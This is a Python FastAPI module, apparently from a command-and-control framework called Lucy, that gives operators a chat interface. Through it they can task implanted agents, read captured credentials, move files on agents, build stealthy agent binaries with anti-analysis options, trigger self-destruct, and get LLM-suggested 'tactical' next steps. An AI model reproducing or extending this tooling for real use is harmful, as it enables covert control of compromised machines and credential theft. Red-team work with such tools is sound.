"""
Chat API for Lucy.

Provides:
- POST /api/v1/chat/command  : submit a natural-language operator command
- GET  /api/v1/chat/history  : paginated chat history

The endpoint translates commands into intents, executes backend actions, and
streams persona-rendered updates through the existing frontend WebSocket.
"""
import json
import logging
from typing import Any

from fastapi import APIRouter, HTTPException, Query
from pydantic import BaseModel

from config import settings
from core.chat_engine import engine as chat_engine, parse_agent_id
from database import database
from db.models import (
    Agent,
    AgentGroup,
    AgentNote,
    Campaign,
    ChatMessage,
    Credential,
    Finding,
    Log,
    Playbook,
    Task,
    Tactic,
    Technique,
    Timeline,
    User,
)
from dependencies import CurrentUser, OperatorUser, TenantId

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/chat", tags=["chat"])

# Shared engine instance is imported from core.chat_engine; action callbacks are
# registered at module import time.


class ChatCommand(BaseModel):
    message: str
    client_context: dict[str, Any] = {}


class ChatResponse(BaseModel):
    intent: str
    status: str
    message: str
    data: dict[str, Any] = {}


# ---------------------------------------------------------------------------
# Action callbacks wired into the engine
# ---------------------------------------------------------------------------

async def _greet(intent, ctx):
    return {"status": "ok", "message": chat_engine.renderer.render("chat_greeting", {})}


async def _help(intent, ctx):
    return {"status": "ok", "message": chat_engine.renderer.render("chat_help", {})}


async def _unknown(intent, ctx):
    return {"status": "ok", "message": chat_engine.renderer.render("chat_unknown", {})}


async def _agent_status(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    agent_id = intent.params.get("agent_id")
    with database:
        q = Agent.select()
        if tenant_id:
            q = q.where(Agent.tenant == tenant_id)
        if agent_id:
            # Allow lookup by short prefix if unique.
            matches = [a for a in q if str(a.id).startswith(agent_id.lower())]
            if len(matches) == 1:
                agent = matches[0]
                msg = (
                    f"{chat_engine.renderer._agent_name(str(agent.id))} is {agent.status}. "
                    f"Last seen {agent.last_seen.isoformat() if agent.last_seen else 'never'}."
                )
                return {"status": "ok", "status_message": msg, "agent": agent.to_dict()}
            agent = Agent.get_or_none(Agent.id == agent_id)
            if agent:
                msg = (
                    f"{chat_engine.renderer._agent_name(str(agent.id))} is {agent.status}. "
                    f"Last seen {agent.last_seen.isoformat() if agent.last_seen else 'never'}."
                )
                return {"status": "ok", "status_message": msg, "agent": agent.to_dict()}
        count = q.count()
        online = q.where(Agent.status == "online").count()
        return {
            "status": "ok",
            "status_message": f"We have {count} agent(s), {online} online.",
            "total": count,
            "online": online,
        }


async def _list_agents(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    with database:
        q = Agent.select()
        if tenant_id:
            q = q.where(Agent.tenant == tenant_id)
        agents = [a.to_dict() for a in q.order_by(Agent.last_seen.desc()).limit(50)]
    return {"status": "ok", "agents": agents}


async def _list_groups(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    with database:
        q = AgentGroup.select()
        if tenant_id:
            q = q.where(AgentGroup.tenant == tenant_id)
        groups = [g.to_dict() for g in q.limit(50)]
    return {"status": "ok", "groups": groups}


async def _run_task(intent, ctx):
    from core.task_queue import TaskQueue

    agent_id = intent.params.get("agent_id")
    if not agent_id:
        raise ValueError("Please specify an agent, e.g. 'run recon on Agent 01'.")

    module = intent.params.get("module", "info")
    action = intent.params.get("action", "run")
    params = intent.params.get("extra", {})
    timeout = intent.params.get("timeout", 60)

    task = await TaskQueue().enqueue(
        agent_id=agent_id,
        module=module,
        action=action,
        params=params,
        priority=intent.params.get("priority", "normal"),
        timeout=timeout,
    )

    return {"status": "ok", "task_id": str(task.id), "agent_id": agent_id}


async def _run_on_group(intent, ctx):
    from core.orchestrator import Orchestrator

    group_id = intent.params.get("group_id")
    if not group_id:
        raise ValueError("Please specify a group, e.g. 'run recon on group Alpha'.")

    module = intent.params.get("module", "info")
    action = intent.params.get("action", "run")
    params = intent.params.get("extra", {})

    # Build an ad-hoc one-step timeline for the group.
    timeline = Timeline.create(
        name=f"chat-{module}-{group_id}",
        steps=[{"order": 0, "module": module, "action": action, "params": params, "delay": 0}],
        agent_group=[group_id],
        trigger="manual",
        status="active",
        created_by=ctx.get("user_id"),
    )

    result = await Orchestrator().execute(str(timeline.id))
    return {"status": "ok", "timeline_id": str(timeline.id), "dispatched": result["dispatched"]}


async def _run_timeline(intent, ctx):
    from core.orchestrator import Orchestrator

    timeline_id = intent.params.get("timeline_id")
    if not timeline_id:
        raise ValueError("Please specify a timeline ID or name.")

    with database:
        timeline = Timeline.get_or_none(Timeline.id == timeline_id)
        if not timeline:
            # Try name match.
            timeline = Timeline.get_or_none(Timeline.name == timeline_id)
    if not timeline:
        raise ValueError(f"Timeline '{timeline_id}' not found.")

    result = await Orchestrator().execute(str(timeline.id))
    return {"status": "ok", "timeline_id": str(timeline.id), "dispatched": result["dispatched"]}


async def _show_credentials(intent, ctx):
    agent_id = intent.params.get("agent_id")
    tenant_id = ctx.get("tenant_id")
    with database:
        q = Credential.select()
        if tenant_id:
            q = q.where(Credential.tenant == tenant_id)
        if agent_id:
            q = q.where(Credential.agent == agent_id)
        creds = [c.to_dict() for c in q.order_by(Credential.captured_at.desc()).limit(20)]
    return {"status": "ok", "count": len(creds), "credentials": creds}


async def _show_findings(intent, ctx):
    agent_id = intent.params.get("agent_id")
    tenant_id = ctx.get("tenant_id")
    with database:
        q = Finding.select()
        if tenant_id:
            q = q.where(Finding.tenant == tenant_id)
        if agent_id:
            q = q.where(Finding.agent_id == agent_id)
        findings = [f.to_dict() for f in q.order_by(Finding.created_at.desc()).limit(20)]
    return {"status": "ok", "count": len(findings), "findings": findings}


async def _show_tasks(intent, ctx):
    agent_id = intent.params.get("agent_id")
    tenant_id = ctx.get("tenant_id")
    with database:
        q = Task.select()
        if tenant_id:
            q = q.where(Task.tenant == tenant_id)
        if agent_id:
            q = q.where(Task.agent == agent_id)
        tasks = [t.to_dict() for t in q.order_by(Task.created_at.desc()).limit(20)]
    return {"status": "ok", "count": len(tasks), "tasks": tasks}


async def _show_logs(intent, ctx):
    # Keep it simple: logs are already visible in the Logs page; chat returns count.
    from core.log_manager import LogManager
    logs = LogManager().recent(limit=10)
    return {"status": "ok", "count": len(logs), "logs": logs}


async def _build_agent(intent, ctx):
    from api.build import BuildRequest, schedule_build

    os = intent.params.get("os", "windows")
    stealth = intent.params.get("stealth_pack", settings.STEALTH_PACK_DEFAULT)
    custom_name = intent.params.get("custom_name", "lucy_agent")

    # Resolve current operator's API key for the build.
    user_id = ctx.get("user_id")
    with database:
        user = User.get_or_none(User.id == user_id) if user_id else None
        api_key = user.api_key if user else ""

    # Determine server URL from request context when possible.
    server_url = intent.params.get("server_url", "http://127.0.0.1:8000")

    req = BuildRequest(
        os=os,
        server_url=server_url,
        api_key=api_key,
        hide_window=True,
        anti_analysis=stealth,
        persistence=False,
        startup_delay=5,
        beacon_jitter=True,
        self_destruct=False,
        custom_name=custom_name,
    )
    operator_id = str(user_id) if user_id else "chat"
    build_id = schedule_build(req, operator_id, require_build_token=False)
    return {"status": "ok", "build_id": build_id}


async def _self_destruct(intent, ctx):
    from core.task_queue import TaskQueue

    agent_id = intent.params.get("agent_id")
    if not agent_id:
        raise ValueError("Please specify which agent to self-destruct, e.g. 'self-destruct Agent 01'.")

    delay = intent.params.get("delay_seconds", 0)
    params = {"delay": delay}

    task = await TaskQueue().enqueue(
        agent_id=agent_id,
        module="stealth",
        action="self_destruct",
        params=params,
        priority="critical",
        timeout=30,
    )
    return {"status": "ok", "task_id": str(task.id), "agent_id": agent_id}


async def _summarize(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    with database:
        online = Agent.select().where(Agent.status == "online")
        queued = Task.select().where(Task.status == "queued")
        creds = Credential.select()
        campaigns = Campaign.select()
        if tenant_id:
            online = online.where(Agent.tenant == tenant_id)
            queued = queued.where(Task.tenant == tenant_id)
            creds = creds.where(Credential.tenant == tenant_id)
            campaigns = campaigns.where(Campaign.tenant == tenant_id)
        summary = chat_engine.renderer.render("chat_summary", {
            "online": online.count(),
            "queued": queued.count(),
            "credentials": creds.count(),
            "campaigns": campaigns.count(),
        })
    return {"status": "ok", "summary": summary}


async def _bulk_task(intent, ctx):
    from core.task_queue import TaskQueue

    tenant_id = ctx.get("tenant_id")
    module = intent.params.get("module", "info")
    action = intent.params.get("action", "run")
    params = intent.params.get("params", {})

    with database:
        q = Agent.select().where(Agent.status == "online")
        if tenant_id:
            q = q.where(Agent.tenant == tenant_id)
        agents = list(q)

    if not agents:
        return {"status": "ok", "message": "No online agents to dispatch the task to."}

    enqueued = []
    for agent in agents:
        task = await TaskQueue().enqueue(
            agent_id=str(agent.id),
            module=module,
            action=action,
            params=params,
            priority="normal",
        )
        enqueued.append(str(task.id))

    msg = chat_engine.renderer.render("bulk_task_queued", {
        "count": len(enqueued),
        "module": module,
    })
    return {"status": "ok", "message": msg, "task_ids": enqueued, "agent_count": len(enqueued)}


async def _file_operation(intent, ctx):
    from core.task_queue import TaskQueue

    agent_id = intent.params.get("agent_id")
    if not agent_id:
        raise ValueError("Please specify an agent, e.g. 'list files on Agent 01 in C:\\\".")

    op = intent.params.get("operation", {})
    operation = op.get("operation", "list")
    path = op.get("path", ".")

    action_map = {
        "list": ("file", "list", {"path": path}),
        "download": ("file", "download", {"path": path}),
        "upload": ("file", "upload", {"path": path}),
        "read": ("file", "read", {"path": path}),
    }
    module, action, task_params = action_map.get(operation, action_map["list"])

    task = await TaskQueue().enqueue(
        agent_id=agent_id,
        module=module,
        action=action,
        params=task_params,
        priority="normal",
    )

    msg = chat_engine.renderer.render("file_operation", {
        "operation": operation,
        "path": path,
        "name": chat_engine.renderer._agent_name(agent_id),
    })
    return {"status": "ok", "message": msg, "task_id": str(task.id)}


async def _add_agent_note(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    user_id = ctx.get("user_id")
    agent_id = intent.params.get("agent_id")
    note_text = intent.params.get("note", "")

    if not agent_id:
        raise ValueError("Please specify which agent to attach the note to.")
    if not note_text:
        raise ValueError("The note content is empty.")

    with database:
        agent = Agent.get_or_none(Agent.id == agent_id)
        if not agent:
            raise ValueError("Agent not found.")
        note = AgentNote.create(
            tenant=tenant_id,
            agent=agent_id,
            user=user_id,
            content=note_text,
            category="observation",
        )

    msg = chat_engine.renderer.render("agent_note_added", {
        "name": chat_engine.renderer._agent_name(agent_id),
    })
    return {"status": "ok", "message": msg, "note_id": str(note.id)}


async def _show_notes(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    agent_id = intent.params.get("agent_id")

    with database:
        q = AgentNote.select()
        if tenant_id:
            q = q.where(AgentNote.tenant == tenant_id)
        if agent_id:
            q = q.where(AgentNote.agent == agent_id)
        notes = [n.to_dict() for n in q.order_by(AgentNote.created_at.desc()).limit(20)]

    msg = chat_engine.renderer.render("notes_list", {"count": len(notes)})
    return {"status": "ok", "message": msg, "notes": notes}


async def _create_campaign(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    name = intent.params.get("campaign_name") or intent.params.get("raw_query", "")[:60]
    if not name:
        raise ValueError("Please provide a campaign name.")

    with database:
        campaign = Campaign.create(
            tenant=tenant_id,
            name=name,
            description=f"Created from chat: {intent.params.get('raw_query', '')}",
            status="active",
        )

    msg = chat_engine.renderer.render("campaign_created", {"name": name})
    return {"status": "ok", "message": msg, "campaign_id": str(campaign.id)}


async def _list_campaigns(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    with database:
        q = Campaign.select()
        if tenant_id:
            q = q.where(Campaign.tenant == tenant_id)
        campaigns = [c.to_dict() for c in q.order_by(Campaign.created_at.desc()).limit(20)]

    msg = chat_engine.renderer.render("campaigns_list", {"count": len(campaigns)})
    return {"status": "ok", "message": msg, "campaigns": campaigns}


async def _campaign_summary(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    campaign_name = intent.params.get("campaign_name")

    with database:
        q = Campaign.select()
        if tenant_id:
            q = q.where(Campaign.tenant == tenant_id)
        if campaign_name:
            q = q.where(Campaign.name.contains(campaign_name))
        campaign = q.order_by(Campaign.created_at.desc()).first()

        if not campaign:
            return {"status": "ok", "message": "I couldn't find a matching campaign."}

        total_agents = Agent.select().where(Agent.tenant == tenant_id).count() if tenant_id else Agent.select().count()
        online = Agent.select().where(Agent.status == "online")
        if tenant_id:
            online = online.where(Agent.tenant == tenant_id)
        online_count = online.count()
        tasks = Task.select().where(Task.tenant == tenant_id).count() if tenant_id else Task.select().count()

    msg = chat_engine.renderer.render("campaign_summary", {
        "name": campaign.name,
        "status": campaign.status,
        "total_agents": total_agents,
        "online": online_count,
        "tasks": tasks,
    })
    return {"status": "ok", "message": msg, "campaign": campaign.to_dict()}


async def _run_playbook(intent, ctx):
    from core.task_queue import TaskQueue

    tenant_id = ctx.get("tenant_id")
    playbook_name = intent.params.get("playbook_name")
    agent_id = intent.params.get("agent_id")
    group_id = intent.params.get("group_id")

    with database:
        q = Playbook.select()
        if tenant_id:
            q = q.where(Playbook.tenant == tenant_id)
        if playbook_name:
            q = q.where(Playbook.name.contains(playbook_name))
        playbook = q.first()

    if not playbook:
        raise ValueError("I couldn't find that playbook.")

    steps = playbook.steps_list or []
    if not steps:
        raise ValueError("That playbook has no steps.")

    # Determine target(s).
    target_ids: list[str] = []
    if agent_id:
        target_ids = [agent_id]
    elif group_id:
        with database:
            group = AgentGroup.get_or_none(AgentGroup.id == group_id)
            if group:
                target_ids = [str(a.id) for a in group.agents]
    else:
        raise ValueError("Please specify an agent or group to run the playbook on.")

    enqueued: list[str] = []
    for target in target_ids:
        for step in steps:
            task = await TaskQueue().enqueue(
                agent_id=target,
                module=step.get("module", "info"),
                action=step.get("action", "run"),
                params=step.get("params", {}),
                priority=step.get("priority", "normal"),
            )
            enqueued.append(str(task.id))

    msg = chat_engine.renderer.render("playbook_started", {
        "name": playbook.name,
        "count": len(enqueued),
    })
    return {"status": "ok", "message": msg, "task_ids": enqueued}


async def _map_technique(intent, ctx):
    tenant_id = ctx.get("tenant_id")
    mitre_id = intent.params.get("mitre_id")
    name = intent.params.get("technique_name")

    with database:
        q = Technique.select()
        if tenant_id:
            q = q.where(Technique.tenant == tenant_id)
        if mitre_id:
            q = q.where(Technique.mitre_id == mitre_id.upper())
        elif name:
            q = q.where(Technique.name.contains(name))
        technique = q.first()

        if not technique:
            # Optionally create a stub if MITRE ID is provided.
            if mitre_id:
                technique = Technique.create(
                    tenant=tenant_id,
                    mitre_id=mitre_id.upper(),
                    name=name or mitre_id.upper(),
                )
            else:
                raise ValueError("Please provide a MITRE ID (e.g. T1059) or technique name.")

    msg = chat_engine.renderer.render("technique_mapped", {
        "mitre_id": technique.mitre_id or "",
        "name": technique.name,
    })
    return {"status": "ok", "message": msg, "technique": technique.to_dict()}


# Register all action callbacks.
chat_engine.register_action("GREETING", _greet)
chat_engine.register_action("HELP", _help)
chat_engine.register_action("UNKNOWN", _unknown)
chat_engine.register_action("AGENT_STATUS", _agent_status)
chat_engine.register_action("LIST_AGENTS", _list_agents)
chat_engine.register_action("LIST_GROUPS", _list_groups)
chat_engine.register_action("RUN_TASK", _run_task)
chat_engine.register_action("RUN_ON_GROUP", _run_on_group)
chat_engine.register_action("RUN_TIMELINE", _run_timeline)
chat_engine.register_action("RUN_PLAYBOOK", _run_playbook)
chat_engine.register_action("BULK_TASK", _bulk_task)
chat_engine.register_action("FILE_OPERATION", _file_operation)
chat_engine.register_action("SHOW_CREDENTIALS", _show_credentials)
chat_engine.register_action("SHOW_FINDINGS", _show_findings)
chat_engine.register_action("SHOW_TASKS", _show_tasks)
chat_engine.register_action("SHOW_LOGS", _show_logs)
chat_engine.register_action("SHOW_NOTES", _show_notes)
chat_engine.register_action("BUILD_AGENT", _build_agent)
chat_engine.register_action("SELF_DESTRUCT", _self_destruct)
chat_engine.register_action("CREATE_CAMPAIGN", _create_campaign)
chat_engine.register_action("LIST_CAMPAIGNS", _list_campaigns)
chat_engine.register_action("CAMPAIGN_SUMMARY", _campaign_summary)
chat_engine.register_action("ADD_AGENT_NOTE", _add_agent_note)
chat_engine.register_action("MAP_TECHNIQUE", _map_technique)
chat_engine.register_action("SUMMARIZE", _summarize)


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@router.post("/command", response_model=ChatResponse)
async def chat_command(
    body: ChatCommand,
    current_user: OperatorUser,
    tenant_id: TenantId,
) -> dict[str, Any]:
    """Accept a natural-language command, execute it, and return a persona response."""
    intent = await chat_engine.parse_async(body.message)

    ctx = {
        "user_id": current_user.get("id"),
        "tenant_id": tenant_id,
        "client_context": body.client_context,
    }

    result = await chat_engine.execute(intent, ctx)

    # Determine the channel from client context (default: global).
    channel = body.client_context.get("channel", "global") if isinstance(body.client_context, dict) else "global"

    # Persist both the user message and the assistant response.
    with database:
        ChatMessage.create(
            tenant=tenant_id,
            user=current_user.get("id"),
            role="user",
            content=body.message,
            channel=channel,
            metadata=json.dumps({"intent": intent.name}),
        )
        ChatMessage.create(
            tenant=tenant_id,
            user=current_user.get("id"),
            role="assistant",
            content=result.get("message", ""),
            channel=channel,
            raw_payload=json.dumps({"intent": intent.name, **result}),
            metadata=json.dumps({"status": result.get("status"), "intent": intent.name}),
        )

    return {
        "intent": intent.name,
        "status": result.get("status", "ok"),
        "message": result.get("message", ""),
        "data": {k: v for k, v in result.items() if k not in ("status", "message")},
    }


@router.get("/history")
async def chat_history(
    current_user: CurrentUser,
    tenant_id: TenantId,
    channel: str = Query("global"),
    limit: int = Query(settings.CHAT_HISTORY_LIMIT, ge=1, le=2000),
    offset: int = Query(0, ge=0),
) -> list[dict[str, Any]]:
    """Return paginated chat history scoped to the current tenant/user, filtered by channel."""
    with database:
        q = ChatMessage.select().where(ChatMessage.channel == channel)
        if tenant_id:
            q = q.where(ChatMessage.tenant == tenant_id)
        messages = (
            q.order_by(ChatMessage.created_at.desc())
            .offset(offset)
            .limit(limit)
        )
        return [m.to_dict() for m in messages]


@router.get("/channels")
async def chat_channels(
    current_user: CurrentUser,
    tenant_id: TenantId,
) -> list[dict[str, Any]]:
    """List all available chat channels: global + one per agent group."""
    channels = [{"id": "global", "label": "Global Feed", "type": "global", "color": "#22c55e", "member_count": 0}]
    try:
        with database:
            q = AgentGroup.select()
            if tenant_id:
                q = q.where(AgentGroup.tenant == tenant_id)
            for g in q:
                channels.append({
                    "id": f"group:{g.id}",
                    "label": g.name,
                    "type": "group",
                    "color": g.color or "#6366f1",
                    "description": g.description or "",
                    "member_count": len(g.members_list),
                })
    except Exception:
        pass
    return channels


# ---------------------------------------------------------------------------
# LLM-enhanced endpoints (require CHAT_LOCAL_LLM_URL to be configured)
# ---------------------------------------------------------------------------

@router.get("/llm/status")
async def llm_status(current_user: CurrentUser) -> dict:
    """Check if the local LLM is available and configured."""
    from core.llm_bridge import bridge
    available = await bridge.is_available() if bridge.enabled else False
    return {
        "enabled": bridge.enabled,
        "available": available,
        "url": bridge.url or None,
        "model": bridge.model if bridge.enabled else None,
    }


@router.post("/llm/suggest")
async def llm_suggest(
    current_user: CurrentUser,
    tenant_id: TenantId,
) -> dict:
    """Get LLM-suggested next tactical steps based on current mission state."""
    from core.llm_bridge import bridge
    if not bridge.enabled:
        return {"enabled": False, "suggestion": None}

    # Gather context
    with database:
        agents = [a.to_dict() for a in Agent.select()]
        tasks = [t.to_dict() for t in Task.select().order_by(Task.created_at.desc()).limit(20)]
        cred_count = Credential.select().count()
        finding_count = Finding.select().count()

    context = {
        "agents": agents,
        "tasks": tasks,
        "credential_count": cred_count,
        "finding_count": finding_count,
    }

    suggestion = await bridge.suggest_next_steps(context)
    return {"enabled": True, "suggestion": suggestion}


@router.post("/llm/summarize")
async def llm_summarize_activity(
    current_user: CurrentUser,
    tenant_id: TenantId,
    limit: int = 20,
) -> dict:
    """Ask the LLM to summarize recent agent activity."""
    from core.llm_bridge import bridge
    if not bridge.enabled:
        return {"enabled": False, "summary": None}

    # Gather recent events from logs
    with database:
        recent_logs = [l.to_dict() for l in Log.select().order_by(Log.timestamp.desc()).limit(limit)]

    events = [{"type": "log", "message": f"[{l.get('level', '?')}] {l.get('message', '')}"} for l in recent_logs]

    summary = await bridge.summarize_activity(events)
    return {"enabled": True, "summary": summary}


# ---------------------------------------------------------------------------
# ShannonAi — dynamic chat engine (logs → dialogue, streaming narratives)
# ---------------------------------------------------------------------------

@router.get("/shannon/status")
async def shannon_status(current_user: CurrentUser) -> dict:
    """Return the current ShannonAi mode and memory depth."""
    from core.shannon_ai import shannon
    from core.llm_bridge import bridge as llm_bridge
    return {
        "mode": shannon.mode,
        "event_count": len(shannon.memory.recent_global(9999)),
        "agents_tracked": len(shannon.memory._by_agent),
        "llm_available": await llm_bridge.is_available() if llm_bridge.enabled else False,
    }


@router.post("/shannon/mode")
async def shannon_set_mode(body: dict, current_user: OperatorUser) -> dict:
    """Switch ShannonAi mode: narrative | hybrid | llm."""
    from core.shannon_ai import shannon
    mode = body.get("mode", "hybrid")
    try:
        shannon.set_mode(mode)
    except ValueError as exc:
        raise HTTPException(400, str(exc))
    return {"mode": shannon.mode}


@router.post("/shannon/narrate")
async def shannon_narrate(
    body: dict,
    current_user: CurrentUser,
    tenant_id: TenantId,
) -> dict:
    """
    Transform a batch of recent logs into a narrative dialogue.
    Body: { agent_id?: str, limit?: int }
    """
    from core.shannon_ai import shannon
    agent_id = body.get("agent_id")
    limit = int(body.get("limit", 30))

    with database:
        q = Log.select()
        if tenant_id:
            q = q.where(Log.tenant == tenant_id)
        if agent_id:
            q = q.where(Log.agent == agent_id)
        logs = [l.to_dict() for l in q.order_by(Log.timestamp.desc()).limit(limit)]

    narrative = shannon.transform_logs(logs, agent_id)
    return {
        "narrative": narrative,
        "log_count": len(logs),
        "mode": shannon.mode,
    }


@router.get("/shannon/recent")
async def shannon_recent(
    current_user: CurrentUser,
    limit: int = Query(10, ge=1, le=100),
) -> dict:
    """Narrate the last N ingested events from ShannonAi's short-term memory."""
    from core.shannon_ai import shannon
    narrative = shannon.narrate_recent(limit=limit)
    events = [
        {
            "event_type": e.event_type,
            "agent_id": e.agent_id,
            "summary": e.summary,
            "severity": e.severity,
            "timestamp": e.timestamp.isoformat(),
        }
        for e in shannon.memory.recent_global(limit)
    ]
    return {"narrative": narrative, "events": events}


@router.get("/shannon/agent/{agent_id}")
async def shannon_agent_narrative(
    agent_id: str,
    current_user: CurrentUser,
    limit: int = Query(8, ge=1, le=50),
) -> dict:
    """Narrate recent activity for a specific agent."""
    from core.shannon_ai import shannon
    narrative = shannon.narrate_agent(agent_id, limit=limit)
    events = [
        {
            "event_type": e.event_type,
            "summary": e.summary,
            "severity": e.severity,
            "timestamp": e.timestamp.isoformat(),
        }
        for e in shannon.memory.recent_for(agent_id, limit)
    ]
    return {"narrative": narrative, "agent_id": agent_id, "events": events}


@router.post("/shannon/stream")
async def shannon_stream_response(
    body: ChatCommand,
    current_user: OperatorUser,
    tenant_id: TenantId,
):
    """
    Stream a ShannonAi response as Server-Sent Events.
    Yields word-sized chunks for a dynamic typing effect in the UI.
    """
    from fastapi.responses import StreamingResponse
    from core.shannon_ai import shannon

    ctx = {
        "user_id": current_user.get("id"),
        "tenant_id": tenant_id,
        "client_context": body.client_context,
    }

    async def event_gen():
        async for chunk in shannon.stream_response(body.message, ctx):
            yield f"data: {json.dumps({'chunk': chunk})}\n\n"
        yield f"data: {json.dumps({'done': True})}\n\n"

    return StreamingResponse(event_gen(), media_type="text/event-stream")


@router.post("/shannon/stream-logs")
async def shannon_stream_logs(
    body: dict,
    current_user: CurrentUser,
    tenant_id: TenantId,
):
    """Stream a log-to-dialogue transformation as SSE."""
    from fastapi.responses import StreamingResponse
    from core.shannon_ai import shannon

    agent_id = body.get("agent_id")
    limit = int(body.get("limit", 30))

    with database:
        q = Log.select()
        if tenant_id:
            q = q.where(Log.tenant == tenant_id)
        if agent_id:
            q = q.where(Log.agent == agent_id)
        logs = [l.to_dict() for l in q.order_by(Log.timestamp.desc()).limit(limit)]

    async def event_gen():
        async for chunk in shannon.stream_log_dialogue(logs, agent_id):
            yield f"data: {json.dumps({'chunk': chunk})}\n\n"
        yield f"data: {json.dumps({'done': True, 'log_count': len(logs)})}\n\n"

    return StreamingResponse(event_gen(), media_type="text/event-stream")
